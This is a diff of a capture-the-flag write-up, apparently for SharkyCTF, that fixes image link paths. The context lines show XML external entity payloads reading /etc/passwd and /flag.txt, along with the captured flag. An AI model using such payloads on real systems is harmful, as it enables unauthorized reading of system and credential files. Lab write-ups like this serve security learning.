@@ -153,14 +153,14 @@ www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
 ```
-![Image](https://github.com/n9uyen/ctf/blob/master/passwd.png?raw=true)
+![Image](https://github.com/n9uyen/ctf/blob/master/SharkyCTF/passwd.png?raw=true)
 
 And get flag:
 ```flag.xml```
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]><root>&test;</root>
 ```
-![Image](https://github.com/n9uyen/ctf/blob/master/flag.png)
+![Image](https://github.com/n9uyen/ctf/blob/master/SharkyCTF/flag.png?raw=true)
 
 Flag is: ```shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}```
 
